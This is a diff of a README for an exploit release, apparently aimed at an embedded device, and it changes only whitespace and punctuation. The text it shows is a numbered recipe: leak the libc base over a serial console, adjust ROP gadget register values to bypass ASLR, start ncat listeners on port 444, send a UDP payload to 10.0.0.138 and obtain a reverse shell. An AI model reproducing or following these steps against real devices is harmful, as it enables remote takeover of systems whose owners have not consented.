@@ -35,22 +35,23 @@ one final remark , this one uses some rop gadgets to bypass aslr , and libc loca
 
 so ... what has to be done : 
 
- 1>  run udp.py , and grab the offset of libc from serial console . 
- 2>  adapt ext789vacv2.py  ( ra , s0 , s4 , s2  registers )  ( libc: 0x2ae50000  , ra = hex(0x2ae50000+0x60330) , and so on .... )
- 3>  (listner.sh) ncat -vv -l 444 --keep-open -c 'cat exit' &  ncat -v -l 444 --keep-open 
- 4>  adjust UDP_IP = "10.0.0.138" on ext789vacv2.py and make sure you are in 10.0.0.1 ( all of them listen on 10.0.0.138 , so this should not be a problem )   and sock.setsockopt(socket.SOL_SOCKET, 25, 'eth1') <---- eth1 interface ( choose yours , not relevant to shellcode payloads ... ) 
- 5> run python ext789vacv2.py
- 6> you should see some activity on the first ncat ( this is good ) 
- 7> you should see some activity on the second ncat , at this point you have a reverse shell on this console, just type ls and the look for youtself
- 8> the rest is up to you . 
+    1>  run udp.py , and grab the offset of libc from serial console . 
+    2>  adapt ext789vacv2.py  ( ra , s0 , s4 , s2  registers )  ( libc: 0x2ae50000  , ra = hex(0x2ae50000+0x60330) , and so on .... )
+    3>  (listner.sh) ncat -vv -l 444 --keep-open -c 'cat exit' &  ncat -v -l 444 --keep-open 
+    4>  adjust UDP_IP = "10.0.0.138" on ext789vacv2.py and make sure you are in 10.0.0.1 ( all of them listen on 10.0.0.138 , so this should not be a problem )   and sock.setsockopt(socket.SOL_SOCKET, 25, 'eth1') <---- eth1 interface ( choose yours , not relevant to shellcode payloads ... ) 
+    5> run python ext789vacv2.py
+    6> you should see some activity on the first ncat ( this is good ) 
+    7> you should see some activity on the second ncat , at this point you have a reverse shell on this console, just type ls and the look for youtself
+    8> the rest is up to you . 
 
 
  be wise , be responsible. 
 
- Cheers 
+ Cheers,
+  
  keep on rolling :) 
 
- 
+
 
 
 
